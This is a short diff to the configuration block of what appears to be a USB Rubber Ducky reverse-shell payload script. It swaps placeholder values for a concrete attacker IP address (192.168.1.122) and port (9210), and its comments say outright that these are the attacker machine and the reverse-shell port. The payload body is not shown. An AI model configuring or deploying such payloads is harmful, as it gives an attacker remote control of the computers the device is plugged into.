@@ -3,8 +3,8 @@
 #-- Payload configuration --#
 
 $DRIVE = 'DUCKY'          # Drive letter of the USB Rubber Ducky
-$IP = 'YOUR_IP'     # IP address of the attacker machine
-$PORT = 'YOUR_PORT'            # Port to use for the reverse shell
+$IP = '192.168.1.122'     # IP address of the attacker machine
+$PORT = '9210'            # Port to use for the reverse shell
 
 
 # Set destination directory
